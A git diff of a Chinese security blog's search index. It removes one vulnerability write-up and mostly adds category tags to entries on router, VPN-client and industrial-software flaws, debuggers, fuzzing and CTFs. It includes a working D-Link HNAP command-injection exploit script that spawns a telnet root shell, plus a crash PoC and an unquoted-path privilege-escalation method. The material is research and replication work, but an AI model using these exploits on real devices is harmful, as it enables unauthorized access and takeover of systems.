class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>仔细观察 CreateProcessAsUserA 函数的使用，其中 lpApplicationName 参数设置成 null，lpCommandLine 参数是 Dst，即经过 ExpandEnvironmentStringsA 处理的路径。</p>
-<p>这是一个比较经典的问题，如果 lpApplicationName 中包含有空值，且 lpCommandLine 变量中的完整模块路径包含有空白符，但是没有包含在引号中的话，就可能会执行其他程序。</p>
-<p>例如路径 C:\Program Files (x86)\Sangfor\SSL\Promote\SangforPromote.exe，如果没有被引号包裹就传递进入 CreateProcessAsUserA，系统可能会解析成以下情况</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Program.exe Files (x86)\Sangfor\SSL\Promote\SangforPromote.exe</span><br></pre></td></tr></table></figure></div>
-
-<p>此时如果 C 盘根目录下有一个名为 Program.exe 的程序，它就会被执行。</p>
-<p>通过交叉引用，可以定位到一个能够自动被触发的调用位置： sub_4120F0</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !sub_4015DC(Dest, <span class="number">0x104</span>u) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_401596(aEcagentSpGetEc, v15);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> ( CreateProcessAsUserA(</span><br><span class="line">               phNewToken,</span><br><span class="line">               <span class="number">0</span>,</span><br><span class="line">               Dest,</span><br><span class="line">               <span class="number">0</span>,</span><br><span class="line">               <span class="number">0</span>,</span><br><span class="line">               <span class="number">0</span>,</span><br><span class="line">               <span class="number">0x420</span>u,</span><br><span class="line">               Environment,</span><br><span class="line">               <span class="number">0</span>,</span><br><span class="line">               &amp;StartupInfo,</span><br><span class="line">               &amp;ProcessInformation) )</span><br></pre></td></tr></table></figure></div>
-
-<p>其中 dest 参数就是上述路径。</p>
-<p>利用 OD 调试观察。首先简单编写一个小程序，将其命名为 Program.exe，放在目标系统的 C 根目录下，用 OD 附加到 SangforPromoteService.exe 进程，在地址 0x41228A 下断点，继续运行程序。</p>
-<p>稍微等待几分钟断点会被触发</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img/vuln1-3.png"
-                     
-                ></p>
-<p>观察到此时 lpCommandLine 为目标程序路径，而且并没有引号包裹，步过发现 Program.exe 被启动，此外，程序还会运行到函数 sub_411820，代码如下</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">sub_411820</span><span class="params">(<span class="type">unsigned</span> __int8 *Source)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [esp+0h] [ebp-15Ch]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [esp+4h] [ebp-158h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+14h] [ebp-148h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">HKEY__</span> <span class="title">Dest</span>[64];</span> <span class="comment">// [esp+58h] [ebp-104h] BYREF</span></span><br><span class="line">  __int16 v7; <span class="comment">// [esp+159h] [ebp-3h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+15Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">  LOBYTE(Dest[<span class="number">0</span>].unused) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dest[<span class="number">0</span>].unused + <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_4015DC(Dest, <span class="number">0x104</span>u) )</span><br><span class="line">    <span class="keyword">return</span> sub_401596(aEcagentSpImpor, v3);</span><br><span class="line">  <span class="keyword">if</span> ( Source )</span><br><span class="line">    _mbsnbcat(Dest, Source, <span class="built_in">strlen</span>(Source));</span><br><span class="line">  ProcessInformation.hProcess = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;StartupInfo, <span class="number">0</span>, <span class="keyword">sizeof</span>(StartupInfo));</span><br><span class="line">  ProcessInformation.hThread = <span class="number">0</span>;</span><br><span class="line">  ProcessInformation.dwProcessId = <span class="number">0</span>;</span><br><span class="line">  ProcessInformation.dwThreadId = <span class="number">0</span>;</span><br><span class="line">  StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">  StartupInfo.lpDesktop = aWinsta0Default;</span><br><span class="line">  <span class="keyword">if</span> ( CreateProcessA(<span class="number">0</span>, Dest, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x20</span>u, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation) )</span><br><span class="line">  &#123;</span><br><span class="line">    CloseHandle(ProcessInformation.hProcess);</span><br><span class="line">    ProcessInformation.hProcess = <span class="number">0</span>;</span><br><span class="line">    result = CloseHandle(ProcessInformation.hThread);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = GetLastError();</span><br><span class="line">    result = sub_401596(aEcagentSpImpor_0, v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>第 27 行调用 CreateProcessA，第二个参数是 lpCommandLine，发现还是之前的程序路径，并且不包含引号。</p>
-<p>执行完上述两部分代码，出现以下界面</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img/vuln1-4.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img/vuln1-5.png"
-                     
-                ></p>
-<p>我们的 Program.exe 被执行两次，一次以当前用户身份执行(CreateProcessAsUserA)，第二次以 SYSTEM 身份执行(CreateProcessA)。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img/vuln1-6.png"
-                     
-                ></p>
-<p>注：SangforPromoteService.exe 内部有一些 log 信息，可以使用 DebugView 软件来查看。</p>
-<p>来看一下新版本中的修复措施，新版本添加一些代码片段</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">snprintf_wrap(&amp;Buffer, <span class="number">260</span>, <span class="string">&quot;\&quot;%s\&quot;&quot;</span>, &amp;CommandLine);</span><br><span class="line">  <span class="keyword">if</span> ( a2 )</span><br><span class="line">    snprintf_wrap(&amp;CommandLine, <span class="number">260</span>, <span class="string">&quot;\&quot;%s\&quot;&quot;</span>, &amp;Buffer);</span><br></pre></td></tr></table></figure></div>
-
-<p>在 CommandLine 参数中添加了 “%s” 双引号约束，可以避免执行其他程序。</p>
-<h2 id="整数溢出导致非法地址访问"><a href="#整数溢出导致非法地址访问" class="headerlink" title="整数溢出导致非法地址访问"></a>整数溢出导致非法地址访问</h2><p>依旧是 EasyConnect  PC 客户端，这里分析的版本是 7.6.3，下载链接</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1YZJ7RoVADfD_TaZrt3sSQQ </span><br><span class="line">提取码：rjdb </span><br></pre></td></tr></table></figure></div>
-
-<p>目标程序是 SangforPromote.exe，关键函数 sub_411B80</p>
-<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">int</span> v10; <span class="comment">// eax  </span></span><br><span class="line"></span><br><span class="line">v10 = *(data + <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span> ( v10 &gt;= <span class="number">0x3FF</span> )</span><br><span class="line">	v10 = <span class="number">0x3FF</span>;</span><br><span class="line">qmemcpy(&amp;v24, (data + <span class="number">12</span>), v10);</span><br></pre></td></tr></table></figure></div>
-
-<p>在上述代码片段中，v10 是用户可控的数据，并且被定义为 signed int，在进行长度判断时，没有考虑负数的情况，如果我们传入 0x80000000 类似的数据，会导致 qmemcpy (实际上是汇编代码的简化表示)拷贝过多的数据，并访问到非法内存地址。</p>
-<p>POC：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">HOST=<span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">PORT=<span class="number">20000</span></span><br><span class="line">teststr =<span class="string">&#x27;\x00\x04\x00\x00&#x27;</span> + <span class="string">&quot;\x0c\x00\x00\x00&quot;</span> + <span class="string">&quot;\x00\x00\x00\x80&quot;</span> + <span class="string">&quot;a&quot;</span> * (<span class="number">0x400</span> - <span class="number">8</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.sendall(teststr)</span><br><span class="line">        data = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(data))</span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    fun()</span><br></pre></td></tr></table></figure></div>
-
-<p>程序的启动方法：SangforPromote.exe &#x2F;StartServer</p>
-<p>OD 附加到进程，在地址 0x411F7F 下断点，然后运行 poc</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img/vuln1-7.png"
-                     
-                ></p>
-<p>观察发现此时 ECX 为 0x20000000，拷贝的次数远大于内存容量，继续执行会出现错误信息：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/img/vuln1-8.png"
-                     
-                ></p>
-]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>Dlink DCS-960L 漏洞复现</title>
@@ -3639,6 +3606,9 @@
                 ></p>
 <p>成功利用了此漏洞绕过登录逻辑。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>NetGear AC2400 漏洞复现</title>
@@ -3755,9 +3725,12 @@
 <p>程序会先用 strstr 定位 ?signature&#x3D; 的位置，然后跳过这个字符串，接着用 sscanf 函数将后续内容拷贝到变量 v229。</p>
 <p>在拷贝的过程中没有判断源字符串长度，可能会导致溢出。不过 IDA 自动识别目的缓冲区大小为 2500 字节，能否传入这么长的 URL 暂时无法确定。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
-    <title>CNVD-2020-59818 (maybe) 复现</title>
+    <title>CNVD-2020-59818</title>
     <url>/2020/12/04/realinfo/</url>
     <content><![CDATA[<p>紫金桥组态软件是某工控系统的上位机控制软件，官方网站：<a class="link"   href="http://www.realinfo.com.cn/" >http://www.realinfo.com.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>此漏洞发布于 2020-12-03，CNVD 链接：<a class="link"   href="https://www.cnvd.org.cn/flaw/show/CNVD-2020-59818" >https://www.cnvd.org.cn/flaw/show/CNVD-2020-59818 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
@@ -3849,6 +3822,9 @@
 <h2 id=""><a href="#" class="headerlink" title="-"></a>-</h2><p>这个漏洞比较简单，目前来看只能造成拒绝服务，暂时不清楚能否对控制系统产生影响，另外在主程序存在数据传输端口 1998，有可能也存在一些问题。</p>
 <p>我们使用了简单的 fuzz 技巧来发现这个漏洞，fuzz 的核心就是定义数据格式适配目标程序，如果大家有更好的模糊测试思路欢迎来信讨论。</p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>Cisco RV110W 数个漏洞</title>
@@ -4015,6 +3991,9 @@
                 ></a></p>
 <h3 id="后台栈溢出"><a href="#后台栈溢出" class="headerlink" title="后台栈溢出"></a>后台栈溢出</h3><p>漏洞利用思路和前面的相同，但是后台价值不高，就不演示了。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>IoT 设备中身份验证绕过的一些漏洞(1)</title>
@@ -4151,6 +4130,9 @@
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">telnet_payload = <span class="string">r&quot;1.com/&amp;amp;$(telnetd$IFS$9-l$IFS$9/bin/sh$IFS$9-b$IFS$9&#x27;0.0.0.0&#x27;)&amp;amp;&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;uid&quot;</span>: <span class="string">&quot;CataLpa&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/xml&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;SOAPACTION&quot;</span>: <span class="string">&quot;\&quot;http://purenetworks.com/HNAP1/SetWebFilterSettings\&quot;&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/xml&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, \</span><br><span class="line">                 <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">burp0_data = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&lt;soap:Envelope xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot; xmlns:xsd=\&quot;http://www.w3.org/2001/XMLSchema\&quot; xmlns:soap=\&quot;http://schemas.xmlsoap.org/soap/envelope/\&quot;&gt;\n&lt;soap:Body&gt;\n&lt;SetWebFilterSettings&gt;\n\t&lt;WebFilterMethod&gt;DENY&lt;/WebFilterMethod&gt;\n\t&lt;NumberOfEntry&gt;1&lt;/NumberOfEntry&gt;\n\t&lt;WebFilterURLs&gt;\n\t\t&lt;string&gt;&quot;</span> + telnet_payload + <span class="string">&quot;&lt;/string&gt;\n\t&lt;/WebFilterURLs&gt;\n&lt;/SetWebFilterSettings&gt;\n&lt;/soap:Body&gt;\n&lt;/soap:Envelope&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Usage: python DIR-878.py &lt;ip&gt;&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    IP = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Send payload to &quot;</span> + IP)</span><br><span class="line">    burp0_url = <span class="string">&quot;http://&quot;</span> + IP + <span class="string">&quot;:80/HNAP1/?Login.html&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;200&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(res.status_code):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Exploit success!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] telnet &quot;</span> + IP)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Exploit failed. Bug fixed :(&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Exploit failed.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure></div>
 
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>TP-Link IP43AN</title>
@@ -4264,6 +4246,9 @@
 
 
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>简单的游戏修改器实现2</title>
@@ -4308,9 +4293,12 @@
 <h2 id="代码实现修改器"><a href="#代码实现修改器" class="headerlink" title="代码实现修改器"></a>代码实现修改器</h2><p>基于以上思路，对之前的修改器进行修改，添加了无限子弹，一击必杀等功能(可能有 BUG)，修改版本已经上传到 Github，感兴趣的朋友可以看一下。</p>
 <p><a class="link"   href="https://github.com/rrrrrrri/MyEtGTrainer" >https://github.com/rrrrrrri/MyEtGTrainer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>GAME</category>
+      </categories>
   </entry>
   <entry>
-    <title>CVE-2019-7406 复现</title>
+    <title>CVE-2019-7406</title>
     <url>/2020/02/29/CVE-2019-7406/</url>
     <content><![CDATA[<p>re365 是 TP-Link 旗下的一款 WiFi 信号拓展器，IBM 安全研究员在此设备上面发现了一个严重的 RCE 漏洞，不需要身份验证，攻击者可以通过向设备发送畸形的 HTTP 数据包在设备上执行任意命令。</p>
 <span id="more"></span>
@@ -4346,6 +4334,9 @@
 
 <p>感兴趣的可以自己搜索一下这段密码，设备默认应该是开放了带有密码的 telnet，得到这串密码的明文我们似乎就可以直接登录设备了。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>OllyDBG ollydbg.ini 缓冲区溢出漏洞复现</title>
@@ -4421,6 +4412,9 @@
 <p>但是综合来看触发漏洞的条件较为苛刻，总体利用价值不算特别高。</p>
 <p>平时使用 OD 的时候尽量不要使用参数功能，必须使用的时候先点击下拉菜单看看有没有特别奇怪的参数。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>简单的游戏修改器实现</title>
@@ -4587,9 +4581,12 @@
 <p>这里暂且不讨论内部修改器的实现方式。</p>
 <p>剩下的都是编码问题了，我把自己写的修改器 demo 上传到 github，项目中代码都很简单，基本思路如上所诉，感兴趣的朋友可以去看看。<a class="link"   href="https://github.com/rrrrrrri/MyEtGTrainer" >https://github.com/rrrrrrri/MyEtGTrainer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 ]]></content>
+      <categories>
+        <category>GAME</category>
+      </categories>
   </entry>
   <entry>
-    <title>为什么调试器能调试？</title>
+    <title>调试器的原理</title>
     <url>/2020/02/21/dig_debugger/</url>
     <content><![CDATA[<p>学习调试器的基本原理。</p>
 <span id="more"></span>
@@ -4675,6 +4672,9 @@
 <p>通过 ptrace 的其他工具，我们可以实现读取目标进程寄存器、代码段数据的目的(需要注意被追踪的程序架构)。</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Trace: RIP = 0x0040e95c, TEXT = 0x20fd8148</span><br><span class="line">Trace: RIP = 0x0040e963, TEXT = 0xdf89f072</span><br><span class="line">Trace: RIP = 0x0040e965, TEXT = 0x34e8df89</span><br><span class="line">Trace: RIP = 0x0040e967, TEXT = 0x030034e8</span><br><span class="line">Trace: RIP = 0x0043e9a0, TEXT = 0x49d76348</span><br><span class="line">Trace: RIP = 0x0043e9a3, TEXT = 0xd0c1c749</span><br><span class="line">Trace: RIP = 0x0043e9aa, TEXT = 0x00e7b841</span><br><span class="line">Trace: RIP = 0x0043e9b0, TEXT = 0x00003cbe</span><br><span class="line">Trace: RIP = 0x0043e9b5, TEXT = 0x0f6619eb</span><br><span class="line">Trace: RIP = 0x0043e9d0, TEXT = 0x44d78948</span><br><span class="line">Trace: RIP = 0x0043e9d3, TEXT = 0x0fc08944</span><br><span class="line">Trace: RIP = 0x0043e9d6, TEXT = 0x3d48050f</span><br><span class="line">Target run 11919 instructions!</span><br></pre></td></tr></table></figure></div>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>固件模拟 Case Study (2)</title>
@@ -4746,6 +4746,9 @@
                 ></p>
 <p>不过，这种模拟方式还存在很多问题，我们现在只能看到 web 界面，并使用很少的一部分功能，大部分功能在发送请求之后会导致 jhttpd 崩溃，经过一番排查发现大部分错误发生在调用某 libc 函数时，例如 ping 功能会调用 fork 函数执行命令，不过 qemu 单独模拟的环境执行 fork 将失败。配置 wifi 的请求会调用某脚本，而模拟环境下脚本不能正常执行，进而整个进程会崩溃。</p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
     <title>固件模拟 Case Study (1)</title>
@@ -4856,9 +4859,12 @@
                      
                 ></p>
 ]]></content>
+      <categories>
+        <category>MISC</category>
+      </categories>
   </entry>
   <entry>
-    <title>CVE-2019-5096 GoAhead 漏洞分析</title>
+    <title>CVE-2019-5096</title>
     <url>/2019/12/23/CVE-2019-5096/</url>
     <content><![CDATA[<p>好久没写博客了，一直在忙考试之类的事情，这个月初（2019-12-02） Cisco 的安全专家披露了 GoAhead 开源 web 服务中存在两个漏洞，CVE 编号 5096 和 5097，5096 是一枚 UAF 漏洞（号称能够达到 RCE），5097 是一枚 DDoS 漏洞。我们简单分析一下 5096.</p>
 <span id="more"></span>
@@ -5027,12 +5033,14 @@
 <h2 id="简单的总结"><a href="#简单的总结" class="headerlink" title="简单的总结"></a>简单的总结</h2><p>第一次分析这种开源软件，如果有任何问题还请各位大佬指正。</p>
 <p>本文只分析了该漏洞的触发流程以及函数调用流程，至于披露者所称的可造成 RCE 我简单想了一下，感觉可利用空间不是特别大，不过还是看服务运行在哪个系统上面，如果是 2.27 等含有 tcache 的 libc 可能存在利用空间，但是 goahead 主要应用在嵌入式系统中，至于在这些系统能否 RCE 还有待商榷，希望有思路的大佬能交流一番。</p>
 ]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
   </entry>
   <entry>
     <title>第八届山东省大学生网络安全技能大赛--“深思杯” WP</title>
     <url>/2019/11/04/sdnisc2019/</url>
-    <content><![CDATA[<p><strong>RE PWN 部分</strong></p>
-<p>又是一年省赛时，今年菜的离谱，把连冠给终结了，CTF 又打不过，离第一名差 20 分，取证又不会，只能靠做做逆向苟命，还是打不过各位带哥。。。</p>
+    <content><![CDATA[<p>又是一年省赛时，今年菜的离谱，把连冠给终结了，CTF 又打不过，离第一名差 20 分，取证又不会，只能靠做做逆向苟命，还是打不过各位带哥。。。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
@@ -5135,6 +5143,9 @@
 
 <p>看起来和 pwn3 差不多呀，也是 off-by-null + size 控制的比较死，时间太晚了，俺要睡觉保命啦，之后有时间再说吧。</p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
   </entry>
   <entry>
     <title>Fuzzing a survey 译文</title>
@@ -5280,6 +5291,9 @@
 <p><strong>Abbreviations</strong><br>AFL: American Fuzzy Lop; BB: Basic Block; DNN: Deep Neural Networks; LSTM: Long Short-Term Memory; POC: Proof of Concept<br><strong>Acknowledgements</strong><br>This research was supported in part by the National Natural Science Foundation of China (Grant No. 61772308 61472209, and U1736209), and Young Elite Scientists Spon- sorship Program by CAST (Grant No. 2016QNRC001), and award from Tsinghua Information Science And Technology National Laboratory.<br><strong>Authors’ contributions</strong><br>JL drafted most of the manuscripts, BZ helped proofreading and summarized parts of the literature, and Prof. CZ abstracted the classifier for existing solutions and designed the overall structure of the paper. All authors read and approved the final manuscript.<br><strong>Competing interests</strong><br>CZ is currently serving on the editorial board for Journal of Cybersecurity.<br><strong>Publisher’s Note</strong><br>Springer Nature remains neutral with regard to jurisdictional claims in published maps and institutional affiliations.</p>
 <p><strong>References</strong><br>Aldeid (2013) Browser fuzzer 3. <a class="link"   href="https://www.aldeid.com/wiki/Bf3" >https://www.aldeid.com/wiki/Bf3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. Accessed 25 Dec 2017<br>Amini P (2017) Sulley fuzzing framework. <a class="link"   href="https://github.com/OpenRCE/sulley" >https://github.com/OpenRCE/sulley <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. Accessed 25 Dec 2017<br>Banks G, Cova M, Felmetsger V, Almeroth K, Kemmerer R, Vigna G (2006) Snooze: toward a stateful network protocol fuzzer. In: International Conference on Information Security. Springer, Berlin. pp 343–358<br>Böhme M, Pham V-T, Nguyen M-D, Roychoudhury A (2017) Directed greybox fuzzing. In: Proceeding CCS ’17 Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, New York. pp 2329–2344. <a class="link"   href="https://doi.org/10.1145/3133956.3134020" >https://doi.org/10.1145/3133956.3134020 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Böhme M, Pham VT, Roychoudhury A (2017) Coverage-based greybox fuzzing as markov chain. In: Proceedings of the 2016 ACM SIGSAC Conference on Computer and Communications Security. ACM. pp 1032–1043<br>Bowne S (2015) Fuzzing with spike. <a class="link"   href="https://samsclass.info/127/proj/p18-spike" >https://samsclass.info/127/proj/p18-spike <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. htm. Accessed 25 Dec 2017<br>Cha SK, Avgerinos T, Rebert A, Brumley D (2012) Unleashing mayhem on binary code. In: Security and Privacy (SP) 2012 IEEE Symposium on. IEEE, San Francisco. pp 380–394. <a class="link"   href="https://doi.org/10.1109/SP.2012.31" >https://doi.org/10.1109/SP.2012.31 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>De Ruiter J, Poll E (2015) Protocol state fuzzing of tls implementations. In: Proceeding SEC’15 Proceedings of the 24th USENIX Conference on Security Symposium. USENIX Association, Berkeley. pp 193–206<br>Godefroid P, Levin MY, Molnar D (2012) Sage: whitebox fuzzing for security testing. Queue 10(1):20<br>Godefroid P, Peleg H, Singh R (2017) Learn &amp; fuzz: Machine learning for input fuzzing. In: Proceeding ASE 2017 Proceedings of the 32nd IEEE&#x2F;ACM International Conference on Automated Software Engineering. IEEE Press, Piscataway. pp 50–59<br>Gorbunov S, Rosenbloom A (2010) Autofuzz: Automated network protocol fuzzing framework. IJCSNS 10(8):239<br>Han H, Cha SK (2017) Imf: Inferred model-based fuzzer. In: Proceeding CCS ’17 Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, New York. pp 2345–2358. <a class="link"   href="https://doi.org/" >https://doi.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>10.1145&#x2F;3133956.3134103<br>Hertz J (2015) Triforceafl . <a class="link"   href="https://github.com/nccgroup/TriforceAFL" >https://github.com/nccgroup/TriforceAFL <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. Accessed 25 Dec 2017<br>James R (2013) Processor tracing. <a class="link"   href="https://software.intel.com/en-us/blogs/" >https://software.intel.com/en-us/blogs/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>2013&#x2F;09&#x2F;18&#x2F;processor-tracing. Accessed 25 Dec 2017<br>Jones D (2010) trinity. <a class="link"   href="https://github.com/kernelslacker/trinity" >https://github.com/kernelslacker/trinity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. Accessed 25 Dec 2017<br>King JC (1976) Symbolic execution and program testing. Commun ACM 19(7):385–394<br>lcamtuf (2014) Fuzzing random programs without execve(). <a class="link"   href="https://lcamtuf/" >https://lcamtuf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. <a class="link"   href="http://blogspot.jp/2014/10/fuzzing-binaries-without-execve.html" >blogspot.jp&#x2F;2014&#x2F;10&#x2F;fuzzing-binaries-without-execve.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>. Accessed 25 Dec 2017<br>libfuzzer (2017) A library for coverage-guided fuzz testing. <a class="link"   href="https://llvm.org/" >https://llvm.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>docs&#x2F;LibFuzzer.html. Accessed 25 Dec 2017<br>Liu B, Shi L, Cai Z, Li M (2012) 